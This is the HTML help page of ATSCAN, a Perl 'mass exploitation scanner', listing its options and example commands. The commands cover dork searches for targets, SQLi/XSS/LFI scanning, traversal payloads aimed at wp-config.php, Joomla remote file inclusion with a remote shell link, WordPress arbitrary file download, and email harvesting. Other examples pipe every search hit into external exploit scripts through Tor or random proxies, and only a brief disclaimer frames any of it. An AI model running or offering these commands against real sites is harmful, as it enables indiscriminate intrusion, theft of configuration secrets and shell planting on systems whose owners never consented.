<html>
<body>
<h1 align="center">ATSCAN</h1>
<p align="center"> <b>Advanced Search / Dork / Mass Exploitation Scanner </b></p>
<table border="0" cellpadding="2" cellspacing="2" width="100%">
  <tr>
    <td align="center"><b>Alisam Technology is not responsible for any misuse, damage caused by this script or attacking targets without prior mutual consent!<b></td>
  </tr>
</table>
<table border="0" cellpadding="0" cellspacing="2" width="100%">
  <tr>
    <td width="100px" class="main2"><b>Tool:</b></td>
    <td width="780px"><b>ATSCAN version 12<b/></td>
  </tr>
  <tr>
    <td width="100px" class="main2"><b>Codename:</b></td><td width="780px">Anon4t</td>
  </tr>
  <tr>
    <td width="100px" class="main2"><b>AUTHOR:</b></td><td width="780px">Ali MEHDIOUI</td>
  </tr>
  <tr>
    <td width="100px" class="main2"><b>GROUP:</b></td><td width="780px">Alisam Technology</td>
  </tr>
  <tr>
    <td width="100px" class="main2"><b>FACE:</b></td><td>facebook.com/Alisam.Technology </td>
  </tr>
  <tr>
    <td width="100px" class="main2"><b>YOUTUBE:</b></td><td>youtube.com/c/AlisamTechnology</td>
  </tr>
  <tr>
    <td width="100px" class="main2"><b>WITTER:</b></td><td>twitter.com/AlisamTechno</td>
  </tr>
  <tr>
    <td width="100px" class="main2"><b>PLUS:</b></td><td>plus.google.com/+AlisamTechnology</td>
  </tr>
</table>
<table border="0" cellpadding="2" cellspacing="5" width="100%">
  <tr>
    <td class="main3"><b>Description:</b></td>
  </tr>
  <tr>
    <td class="main" width="890px"><p>Search engine Google / Bing / Ask / Yandex / Sogou <br />
        Mass Dork Search<br/>Multiple instant scans. <br/>Mass Exploitation <br/>Use proxy. <br/>
        Random user agent. <br/> Random engine.<br/> Extern commands execution.<br/>
        XSS / SQLI / LFI / AFD scanner.<br /> Filter wordpress and Joomla sites in the server. <br />
        Find Admin page.<br />Decode & Encode Base64 / MD5<br/> Ports scan. <br/>Extract IPs<br/>Extract E-mails. <br/>
        Auto detect errors. <br/> Auto detect Cms.<br/>Post data.<br/>Auto sequence repeater.<br/>Validation.<br/>Post and Get method<br/>And more...
    </p></td>
  </tr>
</table>
<table border="0" cellpadding="2" cellspacing="5" width="100%">
  <tr>
    <td class="main3" width="890px"> <b>Libreries to install:</b></td>
  </tr>
  <tr>
    <td class="main">
      Perl Requiered. <br/>
      Works in all platforms.
    </td>
  </tr>
</table>
<table border="0" cellpadding="2" cellspacing="5" width="100%">
  <tr>
    <td class="main3" width="890px"><b>Download:</b></td>
  </tr>
  <tr>
    <td class="main">
      git clone https://github.com/AlisamTechnology/ATSCAN <br/>
      OR direct link: https://github.com/AlisamTechnology/ATSCAN
    </td>
  </tr>
</table>
<table border="0" cellpadding="2" cellspacing="5" width="100%">
  <tr>
    <td class="main3" width="890px"><b>Permissions:</b></td>
  </tr>
  <tr>
    <td class="main">
      cd ATSCAN <br/>
      chmod +x ./atscan.pl
    </td>
  </tr>
</table>
<table border="0" cellpadding="2" cellspacing="5" width="100%">
  <tr>
    <td class="main3" width="890px"><b>Installation:</b></td>
  </tr>
  <tr>
    <td class="main">chmod +x ./install.sh <br/>./install.sh </td>
  </tr>
</table>

<table border="0" cellpadding="2" cellspacing="5" width="100%">
  <tr>
    <td class="main3" width="890px"><b>Execution:</b></td>
  </tr>
  <tr>
    <td class="main">
      Portable Execution: perl ./atscan.pl<br/>
      Installed Tool Execution: atscan
    </td>
  </tr>
</table>
<table border="0" cellpadding="2" cellspacing="5" width="100%">
  <tr>
    <td class="main3" width="890px"><b>Uninstall Tool:</b></td>
  </tr>
  <tr>
    <td class="main">
      atscan --uninstall<br/>
    </td>
  </tr>
</table>
<table border="0" cellpadding="2" cellspacing="5" width="100%">
  <tr>
    <td class="main3"><b>Screenshots:</b></td>
  </tr>
  <tr>
    <td align="center" width="890px">
    <img src="http://i.imgur.com/PW0q9us.jpg" /> <br/><br/>
    <img src="http://i.imgur.com/PtYAitD.jpg" /> <br/><br/>
    <img src="http://i.imgur.com/6Eg3bxo.jpg" /> <br/><br/>
    </td>
  </tr>
</table>
<table border="0" cellpadding="2" cellspacing="5" width="100%">
  <tr>
    <td class="main3" width="890px"><b>Help:</b></td>
  </tr>
  <tr>
    <td class="main"><table border="0" cellpadding="2" cellspacing="5" width="100%">
      <tr>
        <td width="200px" class="main">--help / -h / -?</td>
        <td class="main">Help.</td>
      </tr> 
      <tr>
        <td width="200px" class="main">--proxy</td>
        <td class="main">
          Set tor proxy for scans [EX: --proxy "socks://localhost:9050"]</br>
          Set proxy [EX: --proxy "http://12.45.44.2:8080"] </br>
          Set proxy list [EX: --proxy list.txt] </td>
      </tr> 
      <tr>
        <td width="200px" class="main">-m</td>
        <td class="main">Set engine motors default bing EX: -m [Bing: 1][Google: 2][Ask: 3][Yandex: 4][Sogou: 5][All: all]</td>
      </tr> 
      <tr>
        <td width="200px" class="main">--proxy-random</td>
        <td class="main">Random proxy [EX: --proxy-random list.txt] or --proxy-random "socks://localhost:9050"]</td>
      </tr> 
      <tr>
        <td width="200px" class="main">--m-random</td>
        <td class="main">Random of all disponibles engines</td> 
      </tr> 
      <tr>
        <td width="200px" class="main">--b-random</td>
        <td class="main">Random all disponibles agents </td>
      </tr>
      <tr>
        <td width="200px" class="main">--freq</td>
        <td class="main">Random time frequency (in seconds) </td>
      </tr>
      <tr>
        <td width="200px" class="main">--time</td>
        <td class="main">set browser time out</td> 
      </tr> 
      <tr>
        <td width="200px" class="main">--dork / -d    </td>
        <td class="main"> Dork to search [Ex: house [OTHER]cars [OTHER]hotel] 
      </tr> 
      <tr>
        <td width="200px" class="main">-t</td>
        <td class="main">Target </td>
      </tr> 
      <tr>
        <td width="200px" class="main">--level / -l</td>
        <td class="main"> Scan level (+- Number of page results to scan) </td>
      </tr> 
      <tr>
        <td width="200px" class="main">-p </td>
        <td class="main"> Set test parameter EX:id,cat,product_ID </td>
      </tr> 
      <tr>
        <td width="200px" class="main">--save / -s </td>
        <td class="main"> Output.</td>
      </tr> 
      <tr>
        <td width="200px" class="main">--content</td>
        <td class="main"> Print request content</td>
      </tr> 
      <tr>
        <td width="200px" class="main">--data</td>
        <td class="main"> data. See examples </td>
      </tr> 
      <tr>
        <td width="200px" class="main">--post</td>
        <td class="main"> Use post method </td>
      </tr> 
      <tr>
        <td width="200px" class="main">--get</td>
        <td class="main"> Use get method </td>
      </tr>      
      <tr>
        <td width="200px" class="main">--header</td>
        <td class="main"> Set headers </td>
      </tr>      
      <tr>
        <td width="200px" class="main">--host </td>
        <td class="main"> Domain name [Ex: site.com] </td>
      </tr> 
      <tr>
        <td width="200px" class="main">--nobanner </td>
        <td class="main"> Hide tool banner</td>
      </tr> 
      <tr>
        <td width="200px" class="main">--beep </td>
        <td class="main"> Produce beep sound if positive scan found.</td>
      </tr> 
      <tr>
        <td width="200px" class="main">--ifend</td>
        <td class="main"> Produce beep sound when scan process is finished.</td>
      </tr> 
      <tr>
        <td width="200px" class="main">--noinfo </td>
        <td class="main"> Jump extra results info.</td>
      </tr> 
      <tr>
        <td width="200px" class="main">--limit </td>
        <td class="main"> Limit max positive scan results.</td>
      </tr> 
      <tr>
        <td width="200px" class="main">--valid / -v   </td>
        <td class="main"> Validate by string </td>
      </tr> 
      <tr>
        <td width="200px" class="main">--status  </td>
        <td class="main"> Validate by http header status </td>
      </tr> 
      <tr>
        <td width="200px" class="main">--ifinurl </td>
        <td class="main"> Get targets with exact string matching</td>
      </tr> 
      <tr>
        <td width="200px" class="main">--sregex </td>
        <td class="main"> Get targets with exact regex matching</td>
      </tr> 
      <tr>
        <td width="200px" class="main">--unique  </td>
        <td class="main"> Get targets with exact dork matching</td>
      </tr> 
      <tr>
        <td width="200px" class="main">--replace</td>
        <td class="main"> String to replace </td>
      </tr> 
      <tr>
        <td width="200px" class="main">--with  </td>
        <td class="main"> String to replace with </td>
      </tr> 
      <tr>
        <td width="200px" class="main">--full </td>
        <td class="main"> --replace --full Will replace all url parametres from string to the end</td>
      </tr> 
      <tr>
        <td width="200px" class="main">--payload  </td>
        <td class="main"> Use your own payloads instead of tool ones</td>
      </tr> 
      <tr>
        <td width="200px" class="main">--exp </td>
        <td class="main"> Exploit/Payload </td>
      </tr> 
      <tr>
        <td width="200px" class="main">--sql </td>
        <td class="main"> Xss scan </td>
      </tr> 
      <tr>
        <td width="200px" class="main">--lfi </td>
        <td class="main"> Local file inclusion</td> 
      </tr> 
      <tr>
        <td width="200px" class="main">--joomrfi </td>
        <td class="main"> Scan for joomla local file inclusion.</td>
      </tr> 
      <tr>
        <td width="200px" class="main">--shell </td>
        <td class="main"> Shell link [Ex: http://www.site.com/shell.txt] </td>
      </tr> 
      <tr>
        <td width="200px" class="main">--wpafd  </td>
        <td class="main"> Scan wordpress sites for arbitery file download</td>
      </tr> 
      <tr>
        <td width="200px" class="main">--admin </td>
        <td class="main"> Get site admin page </td>
      </tr> 
      <tr>
        <td width="200px" class="main">--shost  </td>
        <td class="main"> Get site subdomains </td>
      </tr> 
      <tr>
        <td width="200px" class="main">--tcp </td>
        <td class="main"> TCP port </td>
      </tr> 
      <tr>
        <td width="200px" class="main">--udp </td>
        <td class="main"> UDP port</td> 
      </tr> 
      <tr>
        <td width="200px" class="main">--sites  </td>
        <td class="main"> Sites in the server </td>
      </tr> 
      <tr>
        <td width="200px" class="main">--wp</td>
        <td class="main"> Wordpress sites in the server</td>
      </tr> 
      <tr>
        <td width="200px" class="main">--joom  </td>
        <td class="main"> Joomla sites in the server</td>
      </tr> 
      <tr>
        <td width="200px" class="main">--upload </td>
        <td class="main"> Get sites with upload files in the server  </td>
      </tr> 
      <tr>
        <td width="200px" class="main">--zip  </td>
        <td class="main"> Get sites with zip files in the server </td>
      </tr> 
      <tr>
        <td width="200px" class="main">--md5</td>
        <td class="main"> Convert to md5 </td>
      </tr> 
      <tr>
        <td width="200px" class="main">--encode64  </td>
        <td class="main"> Encode base64 string </td>
      </tr> 
      <tr>
        <td width="200px" class="main">--decode64  </td>
        <td class="main"> decode base64 string 
      </tr> 
      <tr>
        <td width="200px" class="main">--TARGET </td>
        <td class="main"> Will be replaced by target in extern command </td>
      </tr> 
      <tr>
        <td width="200px" class="main">--HOST  </td>
        <td class="main"> Will be replaced by host in extern command </td>
      </tr> 
      <tr>
        <td width="200px" class="main">--HOSTIP </td>
        <td class="main"> Will be replaced by host IP in extern command </td>
      </tr> 
      <tr>
        <td width="200px" class="main">--PORT </td>
        <td class="main"> Will be replaced by open port in extern command </td>
      </tr> 
      <tr>
        <td width="200px" class="main">--ip  </td>
        <td class="main"> Crawl to get Ips</td>
      </tr> 
      <tr>
        <td width="200px" class="main">--regex</td>
        <td class="main"> Crawl to get strings matching regex</td>
      </tr> 
      <tr>
        <td width="200px" class="main">--noquery  </td>
        <td class="main"> Remove string value from Query url [ex: site.com/index.php?id=string]  </td> 
      </tr> 
      <tr>
        <td width="200px" class="main">--command /-c  </td>
        <td class="main"> Extern Command to execute</td>
      </tr> 
      <tr>
        <td width="200px" class="main">--email  </td>
        <td class="main"> Get emails </td>
      </tr> 
      <tr>
        <td width="200px" class="main"> rang(x-y) </td>
           <td class="main">EX: --exp "/index.php?id=rang(1-9)" --sql OR -t "site.com/index.php?id=rang(1-9)" --sql</br>
           site.com/index.php?id=1 -> 9.</td>
      </tr> 
      <tr>
        <td width="200px" class="main"> repeat(txt-y) </td>
           <td class="main">EX: --exp "/index.php?id=repeat(../-9)wp-config.php" --sql OR -t "site.com/index.php?id=../wp-config.php"</br>
           In site.com/index.php?id=../wp-config.php then site.com/index.php?id=../../wp-config.php 9 times </td>
      </tr>       
      <tr>
        <td width="200px" class="main">[OTHER]</td>
        <td class="main">To separate values ex: dork1 [OTHER]DORK2 [OTHER]DORK3</td>
      </tr>
      <tr>
        <td width="200px" class="main">[DATA/DATAFILE]</td>
        <td class="main">To separate data values ex: --data "name:username [DATA]email:xxxxxx [DATA]pass:xxxxx/[DATAFILE]pass:file.txt"</td>
      </tr>      
      <tr>
        <td width="200px" class="main">--update</td>
        <td class="main"> Update tool</td>
      </tr>
      <tr>
        <td width="200px" class="main">--tool</td>
        <td class="main">Tool info.</td>
      </tr>
      <tr>
        <td width="200px" class="main">--config</td>
        <td class="main">User configuration.</td>
      </tr>
      <tr>
        <td width="200px" class="main">--uninstall</td>
        <td class="main">Uninstall Tool.</td>
      </tr> 
    </table></td>
  </tr>
</table>
<table border="0" cellpadding="2" cellspacing="5" width="100%">
  <tr>
    <td width="890px"><b>Examples:</b></td>
  </tr>
  <tr>
    <td class="main" width="100%">
      <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>  
      <b>PROXY: </b> <br/>
        Tor: --proxy [proxy] [Ex: --proxy socks://localhost:9050].<br/>
        Proxy: Proxy: --proxy [proxy] [Ex: http://12.32.1.5:8080] or --proxy [list.txt] [Ex: --proxy /root/Desktop/Documents/my_proxies.txt]
      </td></tr></table>
      
      <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>    
        <b>RANDOM: </b> <br/>
        Random proxy --proxy-random [proxy  list.txt] <br/>
        Random browser --b-random <br/>
        Random engine --m-random <br/>
      </td></tr></table>
      
      <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>    
       <b>SET HEADERS:</b> <br/>
       atscan --dork [dork / dorks.txt] --level [level] --header "Authorization:Basic YWRtaW46YWRtaW4 [OTHER]keep_alive:1" <br/>
       atscan -t <target> --data "name:userfile[DATAFILE]value:file.txt --post --header "Authorization:Basic YWRtaW46YWRtaW4 [OTHER]keep_alive:1"
      </td></tr></table>
      
      <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>    
      <b>SEARCH ENGINE: </b> <br/>
       Search: atscan --dork [dork> --level [level]  <br/>
       Search: atscan -d [dork> -l [level]  <br/>
       Set engine: atscan --dork [dork> --level [level] -m [Bing: 1][Google: 2][Ask: 3][Yandex: 4][Sogou: 5][All: all] <br/>
       Set selective engines: atscan -d [dork> -l [level] -m 1,2,3.. <br/>
       Search with many dorks: atscan --dork [dork1 [OTHER]dork2 [OTHER]dork3> --level [level]    <br/>
       Search and rand: atscan -d [dork] -l [level] --exp "/index.php?id=rang(1-9)" --sql   <br/>
       Get Server sites: atscan -t [ip] --level <value> --sites <br/>
       Get Server sites: atscan -t "[ip from]-[ip to]" --level <value> --sites <br/>
       Get Server sites: atscan -t "ip1 [OTHER]ip2" --level <value> --sites <br/>
       
       Get Server wordpress sites: atscan -t [ip] --level <value> --wp  <br/>
       Get Server joomla sites: atscan -t [ip] --level <value> --joom  <br/>
       Get Server upload sites: atscan -t [ip] --level <value> --upload  <br/>
       Get Server zip sites files: atscan -t [ip] --level <value> --zip  <br/>
       WP Arbitry File Download: atscan -t [ip] --level <value> --wpafd  <br/>
       Joomla RFI: atscan -t [ip] --level [10] --joomfri --shell <shell link> <br/>
       Search + output: atscan --dork [dorks.txt] --level [level] --save <br/>
       Search + get emails: atscan -d [dorks.txt] -l [level] --email  <br/>
       Search + get site emails: atscan --dork <site:site.com> --level [level] --email  <br/>
       Search + get ips: atscan --dork [dork> --level [level] --ip 
      </td></tr></table>
      
      <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>    
       <b>REGULAR EXPRESSIONS: </b> <br/>
       Regex use: atscan [--dork [dork> / -t [target]] --level [level] --regex [regex] <br/>
       IP: ((?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){ 3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)) <br/>
       E-mails: '((([A-Za-z0-9]+_+)|([A-Za-z0-9]+\-+)|([A-Za-z0-9]+\.+)|([A-Za-z0-9]+\++))*[A-Za-z0-9]+@((\w+\-+)|(\w+\.))*\w{1,63}\.[a-zA-Z]{2,6})'
      </td></tr></table>
      
      <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>    
       <b>REPEATER:</b> <br/>
       atscan -t site.com?index.php?id=rang(1-10) --sql <br/>
       atscan -t [target] --exp "/index.php?id=rang(1-10)" --sql <br/>
       atscan -t [target] --exp "/index.php?id=repeat(../-9)wp-config.php"
      </td></tr></table>
      
      <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>    
       <b>PORTS</b> <br/>
       atscan -t [ip] --port [port] [--udp / --tcp] <br/>
       atscan -t (ip start)-(ip end) --port [port] [--udp / --tcp] <br/>
       atscan -t [ip] --port (port start)-(port end) [--udp / --tcp] --command "your extern command"
      </td></tr></table>
      
      <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>    
       <b>ENCODE / DECODE:</b> <br/>
       Generate MD5: --md5 [string] <br/>
       Encode base64: --encode64 [string] <br/>
       Decode base64: --decode64 [string]
      </td></tr></table>
      
      <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>    
       <b>DATA:</b> <br/>
       Post data: atscan -t [target] --data "field1:value1 [DATA]field2:value2 [DATA]field3:value3" [--post / --get]<br/>
       Wordlist:  atscan -t [target] --data "name:userfile [DATAFILE]value:file.txt" [--post / --get]<br/>
                  atscan -t [target] --data "username:john [DATA]pass:1234" [--post / --get]<br/>
       Post + Validation: --data "name:userfile [DATAFILE]value:file.txt" -v [string] / --status [code] [--post / --get]
      </td></tr></table>

      
      <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>    
       <b>EXTERNAL COMMANDES:</b> <br/>
       atscan --dork [dork / dorks.txt] --level [level] --command "curl -v --TARGET" <br/>
       atscan --dork [dork / dorks.txt] --level [level] --command "curl -v --HOST"  <br/>
       atscan --dork [dork / dorks.txt] --level [level] --command "nmap sV -p 21,22,80 --HOSTIP"  <br/>
       atscan -d "index of /lib/scripts/dl-skin.php" -l 20 -m 2 --command "php WP-dl-skin.php-exploit.php --TARGET" <br/>
      </td></tr></table>
      
      <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>
       <b>MULTIPLE SCANS: </b><br/>
       atscan --dork [dork> --level [10] --sql --lfi --wp ..<br/>
       atscan --dork [dork> --level [10] --replace [string] --with [string] --exp [payload] [--sql / --lfi / --wp /...]<br/>
       atscan -t [ip] --level [10] [--sql / --lfi / --wp /...]<br/>
       atscan -t [target] [--sql / --lfi / --wp /...]</td></tr></table> 
      <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr>
       <td>
       <b>USER PAYLOADS: </b><br/>
       atscan --dork [dork] --level [10] [--lfi | --sql ..] --payload [payload | payloads.txt]
       </td></tr></table>           
      <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr>
       <td>
       <b>SEARCH VALIDATION: </b><br/>
       atscan -d [dork / dorks.txt] -l [level] --status [code] / --valid [string] <br/>
       atscan -d [dork / dorks.txt] -l [level] --ifinurl [string] <br/>
       atscan -d [dork / dorks.txt] -l [level] --regex [regex] --valid [string] <br/>
       atscan -d [dork / dorks.txt] -l [level] --unique </td></tr></table>     
      <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr>
       <td>
       <b>SCAN VALIDATION: </b><br/>
       atscan -t [target / targets.txt] [--status [code] / --valid [string] <br/>
       atscan -d [dork / dorks.txt] -l [level] --exp [payload] --status [code] / --valid [string] <br/>
       atscan -d [dorks.txt] -l [level] --replace [string] --with [string] --status [code] / --valid [string] <br/>
       atscan -d [dork / dorks.txt] -l [level] [--admin / --sql ..] --status [code] / --valid [string] <br/>  
       atscan -d [dorks.txt] -l [level] --replace [string] --with [string] --status [code] / --valid [string] <br/>
       atscan -d [dorks.txt] -l [level] --replace [string] --with [string] --full --status [code] / --valid [string] <br/>
       atscan -d [dorks.txt] -l [level] --replace [string] --with [string] --exp [payload] --status [code] / --valid [string] <br/>
       atscan --data "name:userfile[DATAFILE]value:file.txt" -v [string] / --status [code] [--post / --get]<br/>
       
       atscan -d [dork / dorks.txt] -l [level] [--sql / --shost ..] --status [code] / --valid [string] <br/>
      </td></tr></table>     
      <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr>
        <td>
         <b>UPDATE TOOL:</b> <br/> 
         atscan --update
      </td></tr></table>     
      <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr>
        <td>
        <b>UNINSTALL TOOL: </b><br/>     
        atscan --uninstall
       </td></tr></table>     
    </td>
  </tr>
</table>  
</body>
</html>

